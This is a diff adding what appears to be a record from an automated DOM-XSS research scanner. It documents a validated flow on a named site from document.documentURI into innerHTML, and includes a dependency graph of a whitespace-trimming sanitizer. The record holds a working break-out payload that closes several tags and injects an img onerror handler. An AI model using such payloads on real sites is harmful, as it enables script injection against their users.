@@ -1,0 +1,78 @@
+// Finding: b7720ea4-5d95-4824-b9db-925735ec0201
+// Finding.url: https://www.example117.com/play/p8165/linha-da-frente##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('dd87070b4ef0432fb96cb109fd3d9a08')><!--/*
+// Finding.parentloc: https://www.example117.com/play/p8165/linha-da-frente##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('dd87070b4ef0432fb96cb109fd3d9a08')><!--/*
+// Finding.domain: www.example117.com
+// Finding.base_domain: example117.com
+// Finding.source: document.documentURI
+// Finding.sink: innerHTML
+// Sanitizer.score: 2
+// Sanitizer.name: o/<
+// Sanitizer.location: https://www.example117.com/common/player/build/rtp-player.min.js?v=20210422-1526 - o/<:7:640562
+// Finding.begin: 216
+// Finding.end: 392
+// Finding.original_uuid: 79808d53-73c9-4b15-a4f7-a361814a9dd0
+// Finding.TwentyFiveMillionFlowsId: 1611337884
+// Finding.script: https://www.example117.com/common/player/build/rtp-player.min.js?v=20210422-1526
+// Finding.line: 7
+// Exploit.uuid: dd87070b-4ef0-432f-b96c-b109fd3d9a08
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: value
+// Exploit.quote_type: "
+// Exploit.tag: input
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 45
+// Exploit.replace_begin_url: 45
+// Exploit.replace_end_url: 45
+// Exploit.replace_begin_param: 261
+// Exploit.replace_end_param: 261
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1430064086
+// DepGraph.sanitizer_hash: -1430064086
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="RegExp: /^[	\n\r Â áš€â€€â€â€‚â€ƒâ€„â€…â€†â€‡â€ˆâ€‰â€Šâ€¯âŸã€€\u2028\u2029﻿][	\n\r Â áš€â€€â€â€‚â€ƒâ€„â€…â€†â€‡â€ˆâ€‰â€Šâ€¯âŸã€€\u2028\u2029﻿]*/"];
+n3 [shape=box, label="Lit: "];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="str_replace_once"];
+n6 [shape=box, label="RegExp: /[	\n\r Â áš€â€€â€â€‚â€ƒâ€„â€…â€†â€‡â€ˆâ€‰â€Šâ€¯âŸã€€\u2028\u2029﻿][	\n\r Â áš€â€€â€â€‚â€ƒâ€„â€…â€†â€‡â€ˆâ€‰â€Šâ€¯âŸã€€\u2028\u2029﻿]*$/"];
+n7 [shape=box, label="Lit: "];
+n8 [shape=box, label="Var: x"];
+n9 [shape=box, label="Var: x"];
+n10 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n8 -> n1;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n9 -> n5;
+n10 -> n9;
+}
